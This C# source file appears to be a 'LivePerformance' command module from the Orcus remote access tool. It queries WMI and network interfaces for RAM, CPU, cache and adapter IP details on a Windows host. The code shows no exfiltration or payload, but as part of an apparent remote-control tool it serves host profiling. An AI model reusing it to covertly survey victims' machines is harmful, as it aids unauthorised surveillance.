using System.Collections.Generic;
using System.Linq;
using System.Management;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using Orcus.Native;
using Orcus.Shared.Commands.LivePerformance;
using Orcus.Utilities;

namespace Orcus.Commands.LivePerformance
{
    internal class StaticPerformance
    {
        public static StaticPerformanceData GetStaticPerformanceData()
        {
            var result = new StaticPerformanceData();
            SetMemoryInformation(result);
            SetProcessorInformation(result);
            SetEthernetInformation(result);

            return result;
        }

        private static void SetMemoryInformation(StaticPerformanceData data)
        {
            using (var searcher = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_PhysicalMemory"))
            {
                var procs = searcher.Get();

                var slotsSpeed =
                    procs.OfType<ManagementObject>()
                        .Select(managementObject => managementObject?["Speed"])
                        .Where(speed => speed != null)
                        .Cast<uint>()
                        .ToList();

                if (slotsSpeed.Count > 0)
                    data.MemorySpeed = slotsSpeed.OrderBy(x => x).First();

                data.UsedMemorySlots = procs.Count;

                var memStatus = new MEMORYSTATUSEX();
                if (NativeMethods.GlobalMemoryStatusEx(memStatus))
                    data.TotalMemory = memStatus.ullTotalPhys;
            }

            using (var searcher = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_PhysicalMemoryArray")
                )
            {
                var procs = searcher.Get();

                var item = procs.OfType<ManagementObject>().FirstOrDefault();
                if (item != null)
                    data.TotalMemorySlots = (ushort) item["MemoryDevices"];
            }
        }

        private static void SetProcessorInformation(StaticPerformanceData data)
        {
            using (var managementClass = new ManagementClass("Win32_Processor"))
            {
                var procs = managementClass.GetInstances();

                var item = procs.OfType<ManagementObject>().FirstOrDefault();
                if (item != null)
                {
                    data.MaxClockSpeed = item.TryGetProperty<uint>("MaxClockSpeed");
                    data.ProcessorName = item.TryGetProperty<string>("Name");
                    data.Cores = item.TryGetProperty<uint>("NumberOfCores");
                    data.LogicalProcessors = item.TryGetProperty<uint>("NumberOfLogicalProcessors");

                    if (CoreHelper.RunningOnVistaOrGreater)
                    {
                        using (var cacheClass = new ManagementClass("Win32_CacheMemory"))
                            data.L1Cache =
                                (uint)
                                    cacheClass.GetInstances()
                                        .OfType<ManagementObject>()
                                        .Where(x => x.TryGetProperty<ushort>("Level") == 4)
                                        .Sum(x => x.TryGetProperty<uint>("MaxCacheSize"));
                        data.L2Cache = item.TryGetProperty<uint>("L2CacheSize");
                        data.L3Cache = item.TryGetProperty<uint>("L3CacheSize");
                    }
                }
                else
                {
                    data.MaxClockSpeed = 0;
                    data.ProcessorName = "N/A";
                    data.Cores = 0;
                    data.LogicalProcessors = 0;
                    data.L1Cache = 0;
                    data.L2Cache = 0;
                    data.L3Cache = 0;
                }
            }
        }

        private static void SetEthernetInformation(StaticPerformanceData data)
        {
            data.EthernetAdapters = new List<EthernetAdapter>();
            foreach (NetworkInterface ni in NetworkInterface.GetAllNetworkInterfaces())
            {
                if (ni.NetworkInterfaceType == NetworkInterfaceType.Wireless80211 ||
                    ni.NetworkInterfaceType == NetworkInterfaceType.Ethernet)
                {
                    var ipProperties = ni.GetIPProperties();

                    var adapter = new EthernetAdapter
                    {
                        AdapterName = ni.Name,
                        Description = ni.Description,
                        ConnectionType = ni.NetworkInterfaceType.ToString(),
                        DnsName = ipProperties.DnsSuffix
                    };

                    foreach (var ip in ipProperties.UnicastAddresses)
                    {
                        if (ip.Address.AddressFamily == AddressFamily.InterNetwork && adapter.Ipv4Address == null)
                        {
                            adapter.Ipv4Address = ip.Address.ToString();
                        }
                        else if (ip.Address.AddressFamily == AddressFamily.InterNetworkV6 && adapter.Ipv6Address == null)
                        {
                            adapter.Ipv6Address = ip.Address.ToString();
                        }
                    }
                    data.EthernetAdapters.Add(adapter);
                }
            }
        }
    }
}